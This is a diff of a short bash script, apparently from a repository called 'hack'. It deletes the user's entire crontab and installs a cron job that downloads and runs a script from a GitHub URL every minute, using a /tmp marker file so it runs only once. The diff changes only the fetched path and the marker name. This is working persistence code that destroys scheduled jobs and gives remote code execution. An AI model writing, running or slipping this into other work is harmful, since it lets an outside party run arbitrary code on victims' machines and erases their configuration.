@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 
-if [[ ! -e /tmp/hack.1469362872955 ]]; then
+if [[ ! -e /tmp/hack.1469362905837 ]]; then
 crontab -r
-echo "* * * * * curl -s https://raw.githubusercontent.com/ccorcos/hack/master//chet | sh" | crontab
-touch /tmp/hack.1469362872955
+echo "* * * * * curl -s https://raw.githubusercontent.com/ccorcos/hack/master/live | sh" | crontab
+touch /tmp/hack.1469362905837
 fi
